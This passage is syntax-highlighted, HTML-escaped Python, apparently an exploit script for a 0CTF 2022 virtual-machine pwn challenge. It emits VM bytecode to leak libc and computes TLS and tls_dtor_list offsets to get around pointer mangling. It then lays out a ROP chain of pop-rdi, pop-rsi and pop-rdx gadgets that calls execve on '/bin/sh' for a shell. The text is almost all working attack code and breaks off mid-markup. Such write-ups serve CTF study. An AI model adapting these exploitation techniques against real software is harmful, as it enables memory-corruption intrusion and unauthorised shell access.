code+=p8(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;sub&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	code +=p8(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;imul&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	code +=p8(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;div&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	code+=p8(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;yu&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	code +=p8(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;left&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	code+=p8(&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;right&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	code +=p8(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;And&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	code +=p8(&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;Or&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	code +=p8(&lt;span class=&#34;number&#34;&gt;11&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;xor&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	code +=p8(&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;judge0&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	code +=p8(&lt;span class=&#34;number&#34;&gt;13&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;jmp&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;address&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	code +=p8(&lt;span class=&#34;number&#34;&gt;14&lt;/span&gt;)+p64(address)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;jnz&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;address&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	code +=p8(&lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;)+p64(address)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;jz&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;address&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	code +=p8(&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;)+p64(address)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;cmpequ&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	code+=p8(&lt;span class=&#34;number&#34;&gt;17&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;cmpsml&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	code+=p8(&lt;span class=&#34;number&#34;&gt;18&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;cmpbig&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	code +=p8(&lt;span class=&#34;number&#34;&gt;19&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;mov_r_i&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;rig,num&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	code+=p8(&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;)+p8(rig)+p64(num)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;mov_m_r&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;rig,offset&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	code +=p8(&lt;span class=&#34;number&#34;&gt;21&lt;/span&gt;)+p8(rig)+p64(offset)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;mov_r_m&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;rig,offset&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	code +=p8(&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;)+p8(rig)+p64(offset)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;clear&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; code&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	code = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#size(stack) = 0x800 ====&amp;gt;we can use it to save 0x100 nums&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;runcode&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;code,code_size,mem_size&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Please input your code size:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(code_size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Please input your memory count:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(mem_size/&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Please input your code:&amp;quot;&lt;/span&gt;,code)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_r_i(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x111111&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_r_i(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x222222&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_r_i(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x333333&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_r_i(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x444444&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#context.log_level = &amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(code))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Welcome to 0ctf2022!!&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;aaa&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;runcode(code,&lt;span class=&#34;number&#34;&gt;0xf0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x600&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(r,&amp;#x27;brva 0x000001582&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;clear()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#leak the libc&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_r_m(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_r_m(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_r_i(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x219ce0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_r_i(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x219ce0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sub()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pop(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;span class=&#34;comment&#34;&gt;#put libc into heap&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_r_i(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x14000000000000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_m_r(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x3a&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;0xa&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_m_r(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x3b&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;0xa&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_r_i(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0xfffffffffffe700e&lt;/span&gt;)&lt;span class=&#34;comment&#34;&gt;#jmp&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_m_r(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x3c&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;0xa&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_r_i(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0xffff&lt;/span&gt;)&lt;span class=&#34;comment&#34;&gt;#addr&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_m_r(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x3d&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;0xa&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(code))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;continue&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;runcode(code,&lt;span class=&#34;number&#34;&gt;0xf0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x600&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;clear()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#we have the libc in mem&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tls_offset = &lt;span class=&#34;number&#34;&gt;0x0028c0&lt;/span&gt;  &lt;span class=&#34;comment&#34;&gt;#libc - &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tls_dtor_list_offset = &lt;span class=&#34;number&#34;&gt;0x0416d8&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;#libc-&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;secret_offset = &lt;span class=&#34;number&#34;&gt;0x0028c0&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;heap_offset = &lt;span class=&#34;number&#34;&gt;0x43ff0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sec_heap_offset = &lt;span class=&#34;number&#34;&gt;0x0082ec&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tls_dtor_list_heap_offset = &lt;span class=&#34;number&#34;&gt;0x0082bb&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(r)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#code3 we need to malloc  a big one&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;jmp(&lt;span class=&#34;number&#34;&gt;0x000186&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;push(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_m_r(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)	&lt;span class=&#34;comment&#34;&gt;#memery[0]  ==libc&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# mov_r_i(1,secret_offset)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# push(1)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# sub()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# pop(2)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# mov_m_r(2,1)	#memery[1] = secret_address&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sec = &lt;span class=&#34;number&#34;&gt;0x5143329d0ccc697&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_r_i(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,sec)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mov_m_r(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,sec_heap_offset)	&lt;span class=&#34;comment&#34;&gt;#secret = 0xcafebabedeadbeef&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pos_offset = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;/&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#read rop to che chunk &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;rop&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;leave_ret = libc + 0x000562ec&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;prdi = libc + 0x002a3e5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;prsi = libc + 0x02be51&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;prdx_pr12 = libc +0x011f497&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;binsh = libc + 0x001d8698&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;execve = libc + 0xeb0f0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;addr = ((leave_ret^sec)&amp;lt;&amp;lt;0x11)&amp;amp;0xffffffffffff8000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;addr += ((leave_ret^sec)&amp;gt;&amp;gt;0x2f)&amp;amp;0x7fff&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rop = p64(prdi) + p64(binsh)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rop += p64(prsi) + p64(0)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rop += p64(prdx_pr12) + p64(0)*2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;rop += p64(execve)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span 